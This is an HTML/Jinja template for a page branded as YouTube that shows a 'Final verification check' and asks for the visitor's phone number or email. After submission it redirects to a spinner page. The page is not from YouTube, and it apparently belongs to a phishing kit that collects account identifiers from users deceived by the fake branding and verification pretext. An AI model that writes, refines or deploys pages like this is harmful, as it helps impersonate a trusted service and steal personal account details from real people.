{% extends "base.html" %}
{% block body %}
<div class="card" style="max-width:520px;margin:28px auto;border-radius:16px;
box-shadow:0 6px 18px rgba(255, 0, 0, 0.25);">

  <div class="platform-header">
    <div class="icon-circle bg-youtube">
      <i class="fa-brands fa-youtube icon-lg"></i>
    </div>
    <div>
      <h2 style="margin:0;color:#FF0000;">YouTube</h2>
      <div style="color:#64748b;font-size:13px">Final verification check.</div>
    </div>
  </div>

  <form id="confirmForm" method="post" novalidate>
    <input class="input" placeholder="Confirm Phone or Email" name="confirm" required>
    <button class="btn login-btn" type="submit">Continue</button>
  </form>
</div>

<script>
document.getElementById("confirmForm").addEventListener("submit", function(event) {
  const field = document.querySelector("input[name='confirm']");

  if (!field.value.trim()) {
    event.preventDefault();
    field.style.borderColor = "red";
    return;
  }

  // âœ… Required redirect for upgraded flow
  window.location.href = "spinner.html";
});
</script>
{% endblock %}
